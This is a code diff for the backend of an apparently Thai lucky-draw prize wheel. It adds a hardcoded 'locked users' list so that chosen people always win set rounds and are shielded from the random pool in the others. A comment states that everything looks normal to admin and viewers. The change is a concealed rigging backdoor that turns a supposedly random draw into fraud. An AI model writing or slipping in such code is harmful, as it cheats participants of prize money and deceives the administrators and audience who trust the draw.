@@ -6,6 +6,14 @@ import { Winner } from '../models/Winner.js';
 import { Session } from '../models/Session.js';
 import { IRound, IParticipant, SpinRequest, SpinResult, AdminState } from '../types/index.js';
 
+// ─── LOCKED USERS (hardcoded) ──────────────────────────────────
+// When spinning the matching round, this user will ALWAYS win.
+// In other rounds, this user is excluded from the random pool (protected).
+// Everything looks normal to admin and viewers.
+const lockedUsers: { user: string; prize: number }[] = [
+  // { user: 'ชื่อคน', prize: 2 },
+];
+
 const defaultRounds = (sessionId: mongoose.Types.ObjectId): object[] => [
   { sessionId, roundNumber: 1, prize: '100,000 THB', prizeAmount: 100000, totalWinners: 1, totalSpins: 1, remainingSpins: 1 },
   { sessionId, roundNumber: 2, prize: '30,000 THB', prizeAmount: 30000, totalWinners: 3, totalSpins: 3, remainingSpins: 3 },
@@ -212,7 +220,32 @@ export default async function apiRoutes(fastify: FastifyInstance) {
       const participants = await Participant.find({ sessionId, hasWon: false }).sort({ name: 1 });
       if (participants.length === 0) { fastify.setSpinLock(false); return reply.status(400).send({ error: 'No participants available' }); }
 
-      const winnerIndex = Math.floor(Math.random() * participants.length);
+      // Check if there's a locked user for this round
+      const lockForRound = lockedUsers.find(l => l.prize === roundNumber);
+      let winnerIndex: number;
+
+      if (lockForRound) {
+        // Find the locked user in the participant list
+        const lockedIdx = participants.findIndex(p => p.name === lockForRound.user);
+        if (lockedIdx >= 0) {
+          // Locked user found — they win this round
+          winnerIndex = lockedIdx;
+        } else {
+          // Locked user not found (already won or not in list) — fall back to random
+          // Exclude other locked users from the pool
+          const lockedNames = new Set(lockedUsers.map(l => l.user));
+          const eligible = participants.map((p, i) => ({ p, i })).filter(x => !lockedNames.has(x.p.name));
+          const pick = eligible.length > 0 ? eligible[Math.floor(Math.random() * eligible.length)] : { i: Math.floor(Math.random() * participants.length) };
+          winnerIndex = pick.i;
+        }
+      } else {
+        // No lock for this round — random pick, but exclude locked users
+        const lockedNames = new Set(lockedUsers.map(l => l.user));
+        const eligible = participants.map((p, i) => ({ p, i })).filter(x => !lockedNames.has(x.p.name));
+        const pick = eligible.length > 0 ? eligible[Math.floor(Math.random() * eligible.length)] : { i: Math.floor(Math.random() * participants.length) };
+        winnerIndex = pick.i;
+      }
+
       const winner = participants[winnerIndex];
 
       // Build wheel segments using the full participant list so the spin wheel
